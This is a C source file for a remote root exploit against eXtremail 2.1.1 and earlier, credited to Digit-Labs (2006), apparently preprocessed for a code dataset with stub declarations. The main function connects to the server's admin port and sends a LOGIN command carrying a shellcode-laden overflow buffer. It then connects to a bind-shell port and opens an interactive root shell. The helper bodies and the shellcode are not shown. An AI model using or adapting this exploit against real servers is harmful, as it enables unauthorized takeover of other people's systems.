
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef int zbuf ;


 int BUF_SIZE ;
 int EXIT_SUCCESS ;
 int NUM_TARGETS ;
 int PORT_ADMIN ;
 int PORT_SHELL ;
 size_t atoi (char*) ;
 int exit (int) ;
 int fprintf (int ,char*,...) ;
 int memset (char*,int,int) ;
 int printf (char*,...) ;
 int send (int,char*,int ,int ) ;
 int shellami (int) ;
 int sleep (int) ;
 int sockami (char*,int ) ;
 int sprintf (char*,char*,char*) ;
 int stderr ;
 int strlen (char*) ;
 int * targets ;
 int zbuffami (char*,int *) ;
 int zbuffcheck (char*) ;

int
main (int argc, char **argv)
{
  int sock;
  char zbuf[BUF_SIZE], sbuf[2 * BUF_SIZE];

  printf ("eXtremail <=2.1.1 remote root exploit\n"
          "by: <mu-b@digit-labs.org>\n"
          "http://www.digit-labs.org/ -- Digit-Labs 2006!@$!\n\n");

  if (argc <= 2)
    {
      fprintf (stderr, "Usage: %s <host> <target>\n", argv[0]);
      exit (EXIT_SUCCESS);
    }

  if (atoi (argv[2]) >= NUM_TARGETS)
    {
      fprintf (stderr, "Only %d targets known!!\n", NUM_TARGETS);
      exit (EXIT_SUCCESS);
    }

  printf ("+Connecting to %s...", argv[1]);
  sock = sockami (argv[1], PORT_ADMIN);
  printf ("  connected\n");





  printf ("+Building buffer with shellcode...");
  memset (zbuf, 0x00, sizeof (zbuf));
  zbuffami (zbuf, &targets[atoi (argv[2])]);
  zbuffcheck (zbuf);
  printf ("  done\n");

  printf ("+Making request...");
  sprintf (sbuf, "LOGIN %s digit-labs.org\n", zbuf);
  send (sock, sbuf, strlen (sbuf), 0);
  printf ("  done\n");

  printf ("+Waiting for the shellcode to be executed...\n");
  sleep (1);
  sock = sockami (argv[1], PORT_SHELL);
  printf ("+Wh00t!\n\n");
  shellami (sock);

  return (EXIT_SUCCESS);
}
